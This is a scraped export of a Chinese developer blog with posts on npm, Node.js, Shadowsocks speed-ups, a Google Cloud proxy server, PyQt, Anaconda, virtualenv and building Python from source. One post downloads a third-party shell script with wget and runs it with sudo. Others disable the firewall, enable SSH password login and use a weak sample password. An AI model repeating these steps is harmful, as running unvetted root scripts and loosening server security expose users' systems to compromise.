全局目录：`npm config get prefix`，一般都是 /usr/local； 然后修改这个目录权限为当前用户：\n\n```shell\nsudo chown -R $(whoami) $(npm config get prefix)/{lib/node_modules,bin,share}\n```\n\n\n\n#### 4.3 package-lock.json\n\n原来package.json文件只能锁定大版本，也就是版本号的第一位，并不能锁定后面的小版本，你每次npm install都是拉取的该大版本下的最新的版本，为了稳定性考虑我们几乎是不敢随意升级依赖包的，这将导致多出来很多工作量，测试/适配等，所以package-lock.json文件出来了，当你每次安装一个依赖的时候就锁定在你安装的这个版本。\n\n那如果我们安装时的包有bug，后面需要更新怎么办？\n\n 在以前可能就是直接改package.json里面的版本，然后再npm install了，但是5版本后就不支持这样做了，因为版本已经锁定在package-lock.json里了，所以我们只能npm install xxx@x.x.x  这样去更新我们的依赖，然后package-lock.json也能随之更新。\n\n\n\n\n\n### 参考资料:\n\nhttp://www.ruanyifeng.com/blog/2016/01/npm-install.html\n\nhttp://www.ruanyifeng.com/blog/2016/10/npm_scripts.html\n\nhttps://blog.csdn.net/u011240877/article/details/76582670","tags":["nodejs"],"categories":["nodejs"]},{"title":"nodejs介绍和javascript的区别","url":"%2Fp%2F74d8b7c3.html","content":"\n### 1. nodejs的诞生\n\n话说有个叫Ryan Dahl的歪果仁，他的工作是用C/C++写高性能Web服务。对于高性能，异步IO、事件驱动是基本原则，但是用C/C++写就太痛苦了。于是这位仁兄开始设想用高级语言开发Web服务。他评估了很多种高级语言，发现很多语言虽然同时提供了同步IO和异步IO，但是开发人员一旦用了同步IO，他们就再也懒得写异步IO了，所以，最终，Ryan瞄向了JavaScript。\n\n因为JavaScript是单线程执行，根本不能进行同步IO操作，所以，JavaScript的这一“缺陷”导致了它只能使用异步IO。\n\n选定了开发语言，还要有运行时引擎。这位仁兄曾考虑过自己写一个，不过明智地放弃了，因为V8就是开源的JavaScript引擎。让Google投资去优化V8，咱只负责改造一下拿来用，还不用付钱，这个买卖很划算。\n\n于是在2009年，Ryan正式推出了基于JavaScript语言和V8引擎的开源Web服务器项目，命名为Node.js。虽然名字很土，但是，Node第一次把JavaScript带入到后端服务器开发，加上世界上已经有无数的JavaScript开发人员，所以Node一下子就火了起来。\n\n<!-- more -->\n\n>  在Node上运行的JavaScript相比其他后端开发语言有何优势？\n\n最大的优势是借助JavaScript天生的事件驱动机制加V8高性能引擎，使编写高性能Web服务轻而易举。\n\n其次，JavaScript语言本身是完善的函数式语言，在前端开发时，开发人员往往写得比较随意，让人感觉JavaScript就是个“玩具语言”。但是，在Node环境下，通过模块化的JavaScript代码，加上函数式编程，并且无需考虑浏览器兼容性问题，直接使用最新的ECMAScript 6标准，可以完全满足工程上的需求。\n\n\n\n### 2. nodeJs和javascript的异同\n\n我相信很多入坑Nodejs的人都是前端转过来的，但是局限于公司项目用不到Nodejs，只能自学，有些重要且基础的东西就忽略了。\n\n前端的JavaScript其实是由ECMAScript、DOM、BOM组合而成。JavaScript=ECMAScript+DOM+BOM。\n\n#### 2.1 javascript：\n\n- ECMAScript(语言基础，如：语法、数据类型结构以及一些内置对象)\n- DOM（一些操作页面元素的方法）\n- BOM（一些操作浏览器的方法）\n\n上面是JavaScript的组成部分，那么Nodejs呢？\n\n#### 2.2 nodejs：\n\n- ECMAScript(语言基础，如：语法、数据类型结构以及一些内置对象)\n- os(操作系统)\n- file(文件系统)\n- net(网络系统)\n- database(数据库)\n\n分析：很容易看出，前端和后端的js相同点就是，他们的语言基础都是ECMAScript，只是他们所扩展的东西不同，前端需要操作页面元素，于是扩展了DOM，也需要操作浏览器，于是就扩展了BOM。而服务端的js则也是基于ECMAScript扩展出了服务端所需要的一些API，稍微了解后台的童鞋肯定知道，后台语音有操作系统的能力，于是扩展os，需要有操作文件的能力，于是扩展出file文件系统、需要操作网络，于是扩展出net网络系统，需要操作数据，于是要扩展出database的能力。\n\n这么一对比，相信很多小伙伴对nodejs更加了解了，原来前端和服务端的js如此相似，他们的基础是相同的，只是环境不同，导致他们扩展出来的东西不同而已。\n\n\n\n### 3. 总结:\n\n在ecmascript部分node和JS其实是一样的，比如与数据类型的定义、语法结构，内置对象。\n\n例如js中的顶层对象是window对象，但是在node中没有什么window对象，node中的顶层对象是global对象。","tags":["nodejs"],"categories":["nodejs"]},{"title":"shadowsocks加速的几种方案","url":"%2Fp%2F4241e56c.html","content":"\n\n\n由于国外VPS服务器与国内用户距离较远，连接线路错综复杂，在数据传输过程中的拥堵和丢包较为严重，从而造成连接速度极速下降，极大影响使用体验。通过加速工具对网络加速处理后，可以明显改善网络传输速度，提升用户体验。\n\n如果你正在使用Shadowsocks/V2ray等科学上网工具，那么经过加速后的网络，速度会有几十倍甚至上百倍的提升，在观看Youtube视频时效果尤其明显。\n\n\n\n### 1. VPS服务器可用的加速方案\n\n相比OpenVZ架构，KVM的全虚拟化技术，使其系统内核可以被随意更换。有了这一特性加持，KVM架构的服务器基本可以适配所有网络加速方案。\n\nKVM可用主流加速方案：\n\n- 原版BBR\n- 魔改BBR\n- 锐速\n- KCPTUN\n\n除特殊情况外，KVM可用的加速方案，XEN架构也能用。\n\n<!-- more -->\n\n**几种方案的加速效果排行:**\n\n+ 根据加速效果：KCPTUN > 魔改BBR ≥ 锐速 > 原版BBR > 无加速\n\n+ 根据安装便利程度：原版BBR > 魔改BBR > 锐速 ≥ KCPTUN\n\n\n\n便利程度这一项有必要详细介绍下：\n\n其实KCPTUN排最后有点委屈，它一不挑架构、二不挑系统，基本是个服务器就能装。之所以排名靠后，仅仅是因为它是唯一需要客户端的加速方案。\n\n锐速为什么排名也靠后？因为它太挑系统内核，对的内核几秒安装成功，不对的内核直接安装不上。\n\n\n\n一、KCPTUN\n\nKCPTUN的加速效果最为突出，在使用时，除了需要安装KCPTUN服务器端外，还需要在本地设备上安装KCPTUN客户端。\n\n优点：不挑架构，OpenVZ也能装；不挑系统版本；加速效果非常明显；可以避开TCP流量限速；可以与锐速/BBR同时安装（加速效果不叠加，因为KCPTUN是UDP流量）。\n\n缺点：需要在本地设备安装客户端；仅加速特定端口，不能对服务器上的网站进行加速。\n\n二、锐速\n\n锐速只需在服务器上安装，但是比较挑系统内核，根据站长的使用经验，推荐在Debian 8 /Debian 7 系统上安装锐速，成功率较高。\n\n优点：仅需在服务器端安装，无需客户端，TCP加速效果明显，可以对网站、Shadowsocks/SSR/V2ray流量进行加速。\n\n不足：不支持OpenVZ架构的系统安装；不支持部分系统内核安装。\n\n三、魔改BBR\n\n魔改BBR是原版BBR基础上的第三方激进版本，效果优于原版BBR。\n\n优点：由于是官方BBR基础上的激进版本，所以优点与原版BBR基本一致，加速效果更为明显。\n\n不足：不支持OpenVZ架构的系统，不支持部分系统版本安装。\n\n四、原版BBR\n\n原版BBR由Google出品，集成在Linux系统的最新内核中，低版本内核通过更换新内核的方式安装BBR。\n\n优点：官方新内核集成不占用系统资源，安装成功率高，TCP加速效果比较明显，可以对网站、Shadowsocks/SSR/V2ray流量进行加速。\n\n不足：不支持OpenVZ架构的系统，加速效果略逊于其它几款。\n\n\n\n也可以参考网络加速工具的测试:   https://www.ljchen.com/archives/1224\n\n\n\n### 2. 判断买的vps使用了什么虚拟技术\n\n\n\n```shell\nsudo apt install virt-what\n\nsudo virt-what  #我的GCP显示为 kvm\n```\n\n如果你的 VPS 使用的是 OpenVZ 的虚拟技术，你是不能使用 BBR 的. 只能安装KCPTUN加速\n\n所以买vps最好买KVM的.\n\n\n\n### 3. bbr, 魔改bbr, bbrplus, 锐速开启\n\n\n\n+ bbr加速原理: https://blog.sometimesnaive.org/article/8\n\n+ 开启bbr方法: [https://github.com/iMeiji/shadowsocks_install/wiki/%E5%BC%80%E5%90%AF-TCP-BBR-%E6%8B%A5%E5%A1%9E%E6%8E%A7%E5%88%B6%E7%AE%97%E6%B3%95](https://github.com/iMeiji/shadowsocks_install/wiki/开启-TCP-BBR-拥塞控制算法)\n\n\n\n我选用的是网上的一键安装脚本, 可以选择安装某个版本并开启 https://loukky.com/archives/479\n\n```shell\nwget \"https://github.com/cx9208/Linux-NetSpeed/raw/master/tcp.sh\" \nchmod +x tcp.sh \nsudo ./tcp.sh\n```\n\n\n\n![1](shadowsocks加速的几种方案/1.png)\n\n\n\n由于我安装的是BBRPlus, 此处输入2.  等安装完毕, 重启后再次运行这个脚本, 输入7\n\n\n\n在过程中出现下面的弹出框, 选no\n\n![1](shadowsocks加速的几种方案/2.png)\n\n\n\n最后通过 `lsmod` 看是否安装成功\n\n![1](shadowsocks加速的几种方案/3.png)\n\n\n\n打开youtube 测试, 发现1080P轻松无压力\n\n![1](shadowsocks加速的几种方案/4.png)\n\n\n\n### 4. KCPTUN 开启\n\n由于kcptun是用的udp, 而bbr是调整了tcp的发包策略, 两个的加速效果不能叠加\n\n并且kctun还需要在客户端上支持, 所以我就没有再折腾. 感兴趣的可以参考:\n\n<https://blog.kuoruan.com/110.html>","tags":["shadowsocks"],"categories":["科学上网"]},{"title":"谷歌云搭建免费服务器并翻墙","url":"%2Fp%2Fb7e5827a.html","content":"\n\n前两年折腾过[亚马逊的免费一年aws并搭建梯子](https://unix2dos.github.io/p/934b1a1.html), 后来发现速度很慢就弃用了. 俗话说免费的是最贵的. 但是google注册之后直接给300刀, 货真价实的钱可以用来买服务器, 简直不要太好用!\n\n> youtube观看1080p无压力\n\n![1](谷歌云搭建免费服务器并翻墙/3.png)\n\n### 1. 注册并申请GCP\n\nhttps://console.cloud.google.com,  在注册时填写个人资料的时候需要填写visa信用卡验证,可以用自己的visa卡(会扣除1美刀但是会返回, 个别银行visa卡不支持), 当然也可以去万能的某宝购买一个虚拟的信用卡, 价值在10元-30元左右.\n\n<!-- more -->\n\n### 2. 创建服务器实例\n\n在GCP控制中心的` Compute Engine` 的 VM 实例里, 点击创建实例. 这里我选用的是Ubuntu 16.04, 机器类型共享vCPU翻墙足矣.\n\n\n![1](谷歌云搭建免费服务器并翻墙/1.png)\n\n\n\n创建成功后,  可以通过网页上的ssh连接进去.\n\n\n\n\n\n### 3. 安全组放开, 固定IP\n\n点击VM实例 -> 内部IP -> 下面的链接 进入VPC网络管理\n\n![1](谷歌云搭建免费服务器并翻墙/2.png)\n\n\n\n\n\n只在vps内关闭防火墙是无效的, 还需要在consle设置防火墙规则. 在`防火墙规则`里创建防火墙规则, 增加要放行的端口(例如接下来要设置的shadowsocks的端口)\n\n另外最好固定下外部ip地址, 否则重启后ip变了, 会非常的麻烦. 在`外部IP地址`里, 增加固定IP即可. \n\n\n\n### 4. 设置第三方ssh登录\n\n\n\n通过网页的ssh操作很麻烦, 我们希望直接通过终端直接连接服务器.\n\n\n\n准备工作:\n\n```shell\nsudo passwd root #给root设置个密码\n\nsudo ufw disable #禁止防火墙, 然并卵, 还需要去控制中心增加防火墙规则\n\n```\n\n\n\n修改sshd_config:\n\n```shell\nsudo vi /etc/ssh/sshd_config # 修改sshd_config, 允许密码登录\n\nPermitRootLogin no\t\t\t\t\t# 允许root登录, 最好保持默认\nPasswordAuthentication yes  # 允许密码登录框\n\nsudo systemctl restart sshd # 最后重启sshd\n```\n\n\n\n最好避免用root直接登录,  可以切到`root`给自己搞个密码然后再把自己加入到sudoer里面.\n\n然后我们就可以通过终端直接连接到服务器了, 但是发现连接比较卡, 这时候我们需要安装下`mosh`优化ssh的连接\n\n\n\n### 4. 安装mosh并开机启动\n\n\n\n安装mosh:\n\n```shell\nsudo apt install mosh\n\n# 安装后直接把ssh换成mosh, 连接后会发现速度快很多.(需要增加防火墙规则允许mosh的端口)\n```\n\n\n\n编写`mosh-server` service文件:\n\n```shell\nsudo vi /etc/systemd/system/mosh-server.service\n\n\n[Unit]\n\nDescription=Mosh server\n\nAfter=network.target\n\n\n\n[Service]\n\nEnvironment=\"LC_ALL=en_US.UTF8\"\n\nExecStart=/usr/bin/mosh-server\n\nType=forking\n\n\n\n[Install]\n\nWantedBy=default.target\n\n```\n\n\n\n启动并设置开机启动:\n\n```shell\nsudo systemctl daemon-reload\n\nsudo systemctl enable mosh-server\n\nsudo systemctl start mosh-server\n```\n\n\n\n客户端直接用mosh连接就可以了, 如果报错 `LC_CTYPE=UTF-8` 的问题需要在两台电脑上加上环境变量(.zshrc|.bashrc)\n\n```shell\nexport LC_ALL=en_US.UTF-8 \nexport LANG=en_US.UTF-8 \nexport LANGUAGE=en_US.UTF-8\n```\n\n\n\n### 5. 安装shadowsocks并开机启动\n\n\n\n安装shadowsocks:\n\n```shell\nsudo apt update\n\nsudo apt install python-pip\n\nwget https://bootstrap.pypa.io/get-pip.py\n\nsudo python get-pip.py\n\nsudo pip install shadowsocks\n```\n\n\n\n编写配置文件:\n\n```shell\nsudo mkdir /etc/shadowsocks/\nsudo vi /etc/shadowsocks/ss-config.json\n\n{\n  \"server\": \"0.0.0.0\",\n  \"server_port\": 6789, # 服务端端口\n  \"local_address\": \"127.0.0.1\",\n  \"local_port\": 1080,\n  \"password\": \"iampasswd\",# 密码\n  \"timeout\": 300,\n  \"method\": \"aes-256-cfb\",#加密方式\n  \"fast_open\": false\n}\n```\n\n\n\n编写`shadowsocks-server` service文件:\n\n```shell\nsudo vi /etc/systemd/system/shadowsocks-server.service\n\n[Unit]\nDescription=Shadowsocks Server\nAfter=network.target\n\n[Service]\nExecStart=/usr/local/bin/ssserver -c /etc/shadowsocks/ss-config.json\nRestart=on-abort\n\n[Install]\nWantedBy=multi-user.target\n```\n\n\n\n启动并设置开机启动:\n\n```shell\nsudo systemctl daemon-reload\nsudo systemctl enable shadowsocks-server\nsudo systemctl start shadowsocks-server\n```\n\n\n\n接下来就下载小飞机连接即可, [下一篇将写如何为shadowsocks加速.](https://unix2dos.github.io/p/4241e56c.html)\n","tags":["shadowsocks"],"categories":["科学上网"]},{"title":"pyqt安装使用打包教程","url":"%2Fp%2Fa0594c46.html","content":"\n\n\n最近准备开发一个GUI程序, 考察了一些能选用的技术,  在windows下有多门语言可以选择(包括易语言哈哈). \n\n但是最初的想法是不仅要快捷开发而且最好跨平台, 跨平台基本没得选了只能用qt了, 但短时间内用c++开发还是没有勇气的, 于是举棋不定选python.\n\n\n\n### 1. 下载 qt designer\n\n因为 Qt Creator实在太大了, 选用Qt Designer.下载链接: https://build-system.fman.io/qt-designer-download\n\n安装成功后, 最好设置`Appearance`里为 `Dockerd Window`, 要不然很别扭\n\n<!-- more -->\n\n![1](pyqt安装使用打包教程/1.png)\n\n\n\n### 2. 下载安装pyqt\n\n```shell\nconda create --name pygui python=3.7   # 强烈建议使用conda, 创建一个新的虚拟环境\nconda activate pygui  # 启用虚拟环境\n\n\nconda install pip  # 安装pip\npip install PyQt5\npip install fbs            \npip install PyInstaller\n```\n\n\n\n### 3. pycharm配置QtDesigner和PyUIC\n\n+ 配置conda\n\n  pycharm 设置 `Project Interpreter` 为 pygui下的python\n\n  ![1](pyqt安装使用打包教程/4.png)\n\n\n\n+ 配置Qt Designer\n\n  Program:  你的Qt Designer的路径\n\n  ![1](pyqt安装使用打包教程/2.png)\n\n\n+ 配置PyUIC\n\n  Program:   你的pyuic5路径\n  Arguments:  `$FileName$ -o $FileNameWithoutExtension$.py`\n  Working directory:  `$FileDir$`\n\n  ![1](pyqt安装使用打包教程/3.png)\n\n\n\n\n### 4. 使用pyqt\n\n+ pyqt教程\n  http://zetcode.com/gui/pyqt5/    \n\n  **应该花至少一个下午的时间先撸一遍这个教程**\n\n\n\n+ qt designer教程\n\n  https://doc-snapshots.qt.io/qt5-5.9/qtdesigner-manual.html\n\n  **应该花至少一个上午的时间先撸一遍这个教程**\n\n  \n\n\n  使用qt designer 设计程序后, 保存为.ui文件.  然后用pycharm的 External tools -> PyUIC 生成 py文件\n\n  在生成的py下面加入这些话, 可以运行\n\n  ```python\n  if __name__ == '__main__':\n      import sys\n      app = QtWidgets.QApplication(sys.argv)\n      MainWindow = QtWidgets.QMainWindow()\n      ui = Ui_MainWindow()\n      ui.setupUi(MainWindow)\n      MainWindow.show()\n      sys.exit(app.exec_())\n  ```\n\n\n\n### 5. 打包安装程序\n\n请参考: \n\n+ https://github.com/mherrmann/fbs\n+ https://github.com/mherrmann/fbs-tutorial\n\n\n\n### 6. pyqt5教程\n\n+ http://zetcode.com/gui/pyqt5/\n\n+ https://zhuanlan.zhihu.com/p/48373518","tags":["pyqt"],"categories":["python"]},{"title":"python包管理器anaconda介绍安装和使用","url":"%2Fp%2F3c2948a5.html","content":"\n\n\n在Python中，安装第三方模块，是通过包管理工具pip完成的。用pip一个一个安装费时费力，还需要考虑兼容性。我们推荐直接使用[anaconda](https://www.anaconda.com/)，这是一个基于Python的数据处理和科学计算平台，它已经内置了许多非常有用的第三方库，我们装上Anaconda，就相当于把数十个第三方模块自动安装好了，非常简单易用。\n\n\n\nanaconda 是一个用于科学计算的Python发行版，支持 Linux, Mac, Windows系统，提供了包管理与环境管理的功能，可以很方便地解决多版本python并存、切换以及各种第三方包安装问题。anaconda 利用工具/命令 conda 来进行 package 和 environment 的管理，并且已经包含了Python和相关的配套工具。\n\n\n\n这里先解释下conda、anaconda这些概念的差别，详细差别见下节。\n\n1. ##### anaconda\n\nanaconda 则是一个打包的集合，里面预装好了 conda、某个版本的python、众多packages、科学计算工具等等，所以也称为Python的一种发行版。其实还有Miniconda，顾名思义，它只包含最基本的内容——python与conda，以及相关的必须依赖项，对于空间要求严格的用户，Miniconda是一种选择。\n\n<!-- more -->\n\n2. ##### conda\n\nconda 可以理解为一个工具，也是一个可执行命令，其核心功能是`包管理`与`环境管理`。 包管理与pip的使用类似，环境管理则允许用户方便地安装不同版本的python并可以快速切换。\n\n\n\n进入下文之前，说明一下conda的设计理念——**conda将几乎所有的工具、第三方包都当做package对待，甚至包括python和conda自身**！因此，conda打破了包管理与环境管理的约束，能非常方便地安装各种版本python、各种package并方便地切换。\n\n\n\n\n\n### 1. anaconda、conda、pip、virtualenv的区别\n\n**1. anaconda**\n\nanaconda是一个包含180+的科学包及其依赖项的发行版本。其包含的科学包包括：conda, numpy, scipy, ipython notebook等。\n\n**2. conda**\n\nconda是包及其依赖项和环境的管理工具。\n\n+ 适用语言：Python, R, Ruby, Lua, Scala, Java, JavaScript, C/C++, FORTRAN。\n+ 适用平台：Windows, macOS, Linux\n+ 用途：快速安装、运行和升级包及其依赖项；在计算机中便捷地创建、保存、加载和切换环境。\n\n如果你需要的包要求不同版本的Python，你无需切换到不同的环境，因为conda同样是一个环境管理器。仅需要几条命令，你可以创建一个完全独立的环境来运行不同的Python版本，同时继续在你常规的环境中使用你常用的Python版本。\n\n+ conda为Python项目而创造，但可适用于上述的多种语言。\n+ conda包和环境管理器包含于anaconda的所有版本当中。\n\n**3. pip**\n\n+ pip是用于安装和管理软件包的包管理器。\n+ pip编写语言：Python。\n+ Python中默认安装的版本：\n\nPython 2.7.9及后续版本：默认安装，命令为pip\nPython 3.4及后续版本：默认安装，命令为pip3\n\n\n\n**4. virtualenv**\n\n用于创建一个独立的Python环境的工具。解决问题：\n1. 当一个程序需要使用Python 2.7版本，而另一个程序需要使用Python 3.6版本，如何同时使用这两个程序？\n2. 如果将所有程序都安装在系统下的默认路径，如：/usr/lib/python2.7/site-packages，当不小心升级了本不该升级的程序时，将会对其他的程序造成影响。\n3. 如果想要安装程序并在程序运行时对其库或库的版本进行修改，都会导致程序的中断。\n4. 在共享主机时，无法在全局site-packages目录中安装包。\n\nvirtualenv将会为它自己的安装目录创建一个环境，这并不与其他virtualenv环境共享库；同时也可以选择性地不连接已安装的全局库。\n\n\n\n### 2. pip 与 conda 比较\n\n1. 依赖项检查\n\n   pip：1. 不一定会展示所需其他依赖包。2. 安装包时或许会直接忽略依赖项而安装，仅在结果中提示错误。\n\n   conda：1. 列出所需其他依赖包。2. 安装包时自动安装其依赖项。3. 可以便捷地在包的不同版本中自由切换。\n\n   \n\n2. 环境管理\n\n   pip：维护多个环境难度较大。\n   conda：比较方便地在不同环境之间进行切换，环境管理较为简单。\n\n  \n\n3. 对系统自带Python的影响\n\n   pip：在系统自带的Python包中 更新/回退版本/卸载 将影响其他程序。\n   conda：不会影响系统自带Python。\n\n  \n\n4. 适用语言\n\n   pip：仅适用于Python。\n   conda：适用于Python, R, Ruby, Lua, Scala, Java, JavaScript, C/C++, FORTRAN。\n\n\n\n### 3. conda与pip、virtualenv的关系\n\nconda结合了pip和virtualenv的功能。\n\n\n\n### 4. anaconda的安装和使用\n\n\n\n**1. 下载安装anaconda**  \n\n下载链接: https://www.anaconda.com/distribution/#download-section\n\n傻瓜安装后, anaconda会把系统Path中的python指向自己自带的Python，并且Anaconda安装的第三方模块会安装在Anaconda自己的路径下，不影响系统已安装的Python目录。\n\n```shell\nwhich python3\n/Users/liuwei/anaconda3/bin/python3\n```\n\n安装成功后在应用程序里打开 `Anaconda Navigator`，会展示出已经安装好的其他常用应用，如：\n\n![1](python包管理器anaconda介绍安装和使用/1.png)\n\n+ Anaconda Navigtor ：用于管理工具包和环境的图形用户界面，后续涉及的众多管理命令也可以在 Navigator 中手工实现。\n\n+ Jupyter notebook ：基于web的交互式计算环境，可以编辑易于人们阅读的文档，用于展示数据分析的过程。\n\n+ qtconsole ：一个可执行 IPython 的仿终端图形界面程序，相比 Python Shell 界面，qtconsole 可以直接显示代码生成的图形，实现多行代码输入执行，以及内置许多有用的功能和函数。\n\n+ spyder ：一个使用Python语言、跨平台的、科学运算集成开发环境。\n\n\n\n**2. 安装后在终端输入conda 无法识别这个命令:**\n\n```shell\nexport PATH=\"${HOME}/anaconda3/bin:$PATH\"\n```\n\n\n\n**3. 修改conda镜像源:**\n\n如不修改conda的镜像源，99.99%会报http链接失败的错误（网友踩坑经验）。\n\n输入以下两条命令来添加清华源：\n\n```shell\nconda config --add channels https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/free/ \nconda config --set show_channel_urls yes\n```\n\n在家目录下会生成`.condarc`文件, 然后把ssl_verfiy改为false,\n\n```\nssl_verify: true\nchannels:\n  - https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/free/\n  - defaults\nshow_channel_urls: true\n```\n\n\n\n然后用 conda info 查看当前配置信息，channel URLs 字段内容变为清华即修改成功。\n\n\n\n### 5. anaconda python环境的创建和切换\n\n+ 可以在`anaconda-navigator`创建新的环境\n\n  ![1](python包管理器anaconda介绍安装和使用/2.png)\n\n\n\n 也可以命令行创建:\n\n```shell\nconda create -n py27 python=2.7 或 conda create --name py27 python=2.7\n```\n\n\n\n+ 使用如下命令，查看当前有哪些环境：\n\n```shell\nconda info -e\n\nWARNING: The conda.compat module is deprecated and will be removed in a future release.\n\n# conda environments:\n#\nbase                  *  /Users/liuwei/anaconda3\npy27                     /Users/liuwei/anaconda3/envs/py27\n```\n\n星号表示当前激活的环境。\n\n\n\n+ 激活py27环境：\n\n```shell\nsource activate py27 \n或 \nconda activate py27\n```\n\n\n\n这时候看python, 已经链接到py27了\n\n```shell\nwhich python\n\n/Users/liuwei/anaconda3/envs/py27/bin/python\n```\n\n\n\n+ 退出当前环境\n\n```shell\nconda deactivate \n或 \nsource deactivate\n```\n\n\n\n+ 查看安装了哪些包\n\n```shell\nconda list\n```\n\n 以后可以通过`anaconda-navigator`在指定环境下安装包\n\n![1](python包管理器anaconda介绍安装和使用/4.png)\n\n\n\n### 6. 配置pycharm使用anaconda环境\n\n在`Project Interpreter` 增加 virtualenvs的特定环境下的执行程序\n\n![1](python包管理器anaconda介绍安装和使用/3.png)\n\n\n\n\n\n### 7. 常用命令总结\n\n```bash\nconda info -e  # 查看有哪些环境\nconda create --name py27 python=2.7 # 创建一个环境\nconda env remove --name py37 # 删除一个环境\nconda activate py27 # 激活某个环境\nconda deactivate  #退出当前环境\nconda list # 查看安装了哪些包\n\n# conda 里集成 pip, 以防 conda 没有的包, 通过 pip 来安装\nconda install pip\n\nwhich pip\n/Users/liuwei/anaconda3/bin/pip\n\npip install xxx\n```\n\n","tags":["anaconda"],"categories":["python"]},{"title":"python隔离环境virtualenv和virtualenvwrapper的使用","url":"%2Fp%2F8731aeb9.html","content":"\n\n\n如果我们要同时开发多个应用程序，那这些应用程序都会共用一个Python，就是安装在系统的Python 3。如果应用A需要jinja 2.7，而应用B需要jinja 2.6怎么办？\n\n这种情况下，每个应用可能需要各自拥有一套“独立”的Python运行环境。virtualenv就是用来为一个应用创建一套“隔离”的Python运行环境。\n\n\n\n### 1. 安装使用virtualenv(推荐使用virtualenvwrapper)\n\n首先，我们用pip安装virtualenv：\n\n```shell\nsudo pip3 install virtualenv\n```\n\n然后，假定我们要开发一个新的项目，需要一套独立的Python运行环境，可以这么做：\n\n\n\n<!-- more -->\n\n+ 第一步，创建目录：\n\n```shell\nmkdir myproject\ncd myproject/\n```\n\n\n\n+ 第二步，创建一个独立的Python运行环境，命名为venv：\n\n```shell\nvirtualenv --no-site-packages venv\n\nvirtualenv -p /Library/Frameworks/Python.framework/Versions/3.7/bin/python3 --no-site-packages venv  # 指定特定的版本创建隔离环境\n```\n\n\n\n命令virtualenv就可以创建一个独立的Python运行环境，我们还加上了参数--no-site-packages，这样，已经安装到系统Python环境中的所有第三方包都不会复制过来，这样，我们就得到了一个不带任何第三方包的“干净”的Python运行环境。\n\n\n\n+ 第三步, 新建的Python环境被放到当前目录下的venv目录。有了venv这个Python环境，可以用source进入该环境：\n\n```shell\nsource venv/bin/activate\n或\n. venv/bin/activate\n```\n\n注意到命令提示符变了，有个(venv)前缀，表示当前环境是一个名为venv的Python环境。 \n\n（mac iterm2+zsh下会出现蟒蛇哦, 即python的logo）\n\n\n\n在venv环境下，用pip安装的包都被安装到venv这个环境下，系统Python环境不受任何影响。也就是说，venv环境是专门针对myproject这个应用创建的。\n\n\n\n+ 第四步, 退出当前的venv环境，使用deactivate命令：\n\n```shell\ndeactivate\n```\n\n此时就回到了正常的环境，现在pip或python均是在系统Python环境下执行。\n\n完全可以针对每个应用创建独立的Python运行环境，这样就可以对每个应用的Python环境进行隔离。\n\n\n\nvirtualenv是如何创建“独立”的Python运行环境的呢？原理很简单，就是把系统Python复制一份到virtualenv的环境，用命令`source venv/bin/activate`进入一个virtualenv环境时，virtualenv会修改相关环境变量，让命令python和pip均指向当前的virtualenv环境。\n\nvirtualenv为应用提供了隔离的Python运行环境，解决了不同应用间多版本的冲突问题。\n\n\n\n\n\n### 2. 安装virtualenvwrapper\n\nvirtualenv需要每次使用source命令导入虚拟机运行环境，这一点非常麻烦，另外开发者还有可能忘记虚拟环境目录的建立位置，virtualenvwrapper这一命令行工具就是通过对virtualenv进行封装，解决了上述问题\n\n\n\n首先是安装:\n\n```shell\nsudo pip3 isntall virtualenvwrapper\n```\n\n\n\n安装后查找virtualenvwrapper.sh:\n\n```shell\nwhich virtualenvwrapper.sh \n\n/Library/Frameworks/Python.framework/Versions/3.7/bin/virtualenvwrapper.sh\n```\n\n\n\n然后修改环境变量配置 `.zshrc`:\n\n```shell\nexport WORKON_HOME=$HOME/virtualenvs \n\nexport VIRTUALENVWRAPPER_SCRIPT=/Library/Frameworks/Python.framework/Versions/3.7/bin/virtualenvwrapper.sh \n\nexport VIRTUALENVWRAPPER_PYTHON=/Library/Frameworks/Python.framework/Versions/3.7/bin/python3 \n\nexport VIRTUALENVWRAPPER_VIRTUALENV=/Library/Frameworks/Python.framework/Versions/3.7/bin/virtualenv \n\nexport VIRTUALENVWRAPPER_VIRTUALENV_ARGS='--no-site-packages' \n\nsource /Library/Frameworks/Python.framework/Versions/3.7/bin/virtualenvwrapper.sh \n```\n\n\n\n中间的4行和你本机的python版本和路径要保持一致，此处注意如果不加上面中间4行，则会出现下面的错误：\n\n```shell\n/usr/bin/python: No module named virtualenvwrapper\n```\n\n至此大功告成，可以方便的使用virtualenvwrapper了。\n\n\n\n\n\n### 3. 使用virtualenvwrapper\n\n\n\n创建虚拟环境:\n\n```shell\nmkvirtualenv newenv  \n```\n\n\n\n这样就建立了一个虚拟的运行环境，而且一开始就处于激活状态，但看不到newenv目录，其实virtualenvwrapper对虚拟机环境作了统一的管理，根据上面配置的环境变量WORK_HOME的路径信息，在其中建立了虚拟运行环境目录.\n\n\n\n其他有用的命令:\n\n- workon: 打印所有的虚拟环境；\n- mkvirtualenv xxx: 创建 xxx 虚拟环境;\n- workon xxx: 使用 xxx 虚拟环境;\n- deactivate: 退出 xxx 虚拟环境；\n- rmvirtualenv xxx: 删除 xxx 虚拟环境。\n\n\n\n\n\n### 4. 配置pycharm使用隔离环境\n\n在`Project Interpreter` 增加 virtualenvs的特定环境下的执行程序\n\n![1](python隔离环境virtualenv和virtualenvwrapper的使用/1.png)","tags":["virtualenv"],"categories":["python"]},{"title":"linux源码安装python3","url":"%2Fp%2F95e70f76.html","content":"\n\n\nlinux下大部分系统默认自带python2.x的版本. 默认的python被系统很多程序所依赖，比如centos下的yum就是python2写的，所以默认版本不要轻易删除，否则会有一些问题.\n\n如果需要使用最新的Python3那么我们可以编译安装源码包到独立目录，这和系统默认环境之间是没有任何影响的，python3和python2两个环境并存即可\n\n作为作死小能手, 不装最新版本怎么能行? 所以手动编译python3源码进行安装, 并记录遇到的一些问题.\n\n<!-- more -->\n\n\n\n### 1. 下载源码:\n\nhttps://www.python.org/downloads/source/\n\n找到最新的Source release 下载即可\n\n\n\n### 2. 安装准备工作:\n\n事实证明下面的这些软件不安装, 在编译python3时会出现各种问题, 所以先把这些软件都安装了.\n\n```shell\nyum install gcc  \n\nyum install zlib* # 注意此处带*, 因为需要 zlib-devel\n\nyum install libffi-devel # 不安装报错ModuleNotFoundError: No module named '_ctypes'\n\nyum install openss openssl-devel # 不安装会导致pip3缺少ssl, 无法下载包\n\n```\n\n\n\n### 3. 源码安装python3.7\n\n```shell\nwget https://www.python.org/ftp/python/3.7.3/Python-3.7.3.tgz  # 下载源码\n\ntar -zxvf Python-3.7.3.tgz\n\ncd Python-3.7.3\n\n./configure 